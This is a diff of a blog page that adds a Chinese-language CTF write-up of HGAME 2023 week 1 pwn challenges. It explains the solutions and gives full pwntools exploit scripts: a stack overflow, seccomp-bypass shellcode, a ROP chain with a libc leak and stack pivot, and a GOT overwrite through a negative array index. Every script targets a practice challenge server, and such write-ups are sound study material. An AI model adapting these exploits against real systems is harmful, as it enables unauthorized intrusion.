@@ -223,7 +223,7 @@
       
       <span class="tag">
         
-        <a href="/tags/PWN/" style="color: #ff7d73; margin-right: 0.5rem;">PWN</a>
+        <a href="/tags/PWN/" style="color: #ffa2c4; margin-right: 0.5rem;">PWN</a>
       </span>
       
     </span>
@@ -241,6 +241,36 @@
           <p>[HGAME 2023 week1] PWN 复现</p>
 <span id="more"></span>
 
+<h2 id="test_nc"><span id="test_nc">test_nc</span></h2><p>签到题：</p>
+<blockquote>
+<p>nc 一下</p>
+<p>cat flag</p>
+</blockquote>
+<hr>
+<h2 id="easy_overflow"><span id="easy_overflow">easy_overflow</span></h2><p>经典的栈溢出，但需要注意 <code>close(1)</code> 关闭了标准输出流，因此需先打开才能拿到 shell。EXP 如下</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40117E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="simple_shellcode"><span id="simple_shellcode">simple_shellcode</span></h2><p>首先ida一下，可以很明显的了解到跟沙盒有关，再查一下沙盒机制，显然不能直接构造orw，再加上read所存储的字节数少，不能直接构造，所以可以在mmap上面来构造orw</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p>mmap函数解析：</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28291</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0xcafe0000</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>)))</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="orw"><span id="orw">orw</span></h2><p>先ida一下，可以看出来需要进行栈迁移，并且还存在沙盒，还有一段0x30的空间（溢出的空间较大），这就是为什么exp和[NSSCTF Round#14 Basic] rbp 不一样的原因，可溢出的空间不同，导致所利用的条件不同</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
+<p>先泄露libc，再把orw写在自己确定的bss段，再用 leave ret 转到bss段，执行orw</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28392</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret     = <span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x401391</span></span><br><span class="line">bss_addr        = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">puts_plt        = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got        = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr       = <span class="number">0x4012c0</span></span><br><span class="line">leave_ret       = <span class="number">0x4012be</span></span><br><span class="line">read            = <span class="number">0x4012CF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;task.\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">open_addr  = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr  = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x142c92</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>) + p64(bss_addr+<span class="number">0x100</span>) + p64(read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="choose_the_seat"><span id="choose_the_seat">choose_the_seat</span></h2><p>该题存在数组越界导致的 GOT overwrite 利用流程，利用负数越界和 one‑gadget 获取 shell，这题有点难，不太会写，此题存在数组越界（下次懂了再来）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./choose&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28620</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x4011d6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-8&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget  = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
         </div>
       
@@ -328,7 +358,7 @@
           <div class="toc-header">
             <i class="fa-solid fa-list-ul"></i> 目录
           </div>
-          
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#test_nc"><span class="toc-number">1.</span> <span class="toc-text">test_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_overflow"><span class="toc-number">2.</span> <span class="toc-text">easy_overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple_shellcode"><span class="toc-number">3.</span> <span class="toc-text">simple_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-number">4.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#choose_the_seat"><span class="toc-number">5.</span> <span class="toc-text">choose_the_seat</span></a></li></ol>
         </div>
       </div>
     </div>
@@ -339,19 +369,19 @@
 <div class="post-nav-outer" style="max-width: 1200px; margin: 3rem auto 0; display: flex; justify-content: center;">
   <div class="post-nav-inner" style="flex: 3; display: flex; gap: 1rem;">
     
-      <a href="/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="flex: 1; text-decoration: none; color: #ccc;">
+      <a href="/%5BCISCN%202019%E5%8D%8E%E5%8C%97%5D%20PWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%20%E5%A4%8D%E7%8E%B0/" style="flex: 1; text-decoration: none; color: #ccc;">
         <div>
           <div style="font-size: 0.85rem; color: #492630;">⬅ 上一篇</div>
-          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">2024年度总结：保持正念 延迟满足</div>
+          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[CISCN 2019华北] PWN5（ciscn_2019_n_5） 复现</div>
           <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2024-12-31
+            <i class="fa fa-calendar"></i> 2023-09-05
             
               &nbsp;| <i class="fa fa-folder-open"></i> 
             
             
               &nbsp;| <i class="fa fa-tags"></i>
               
-                奋进
+                PWN
               
             
           </div>
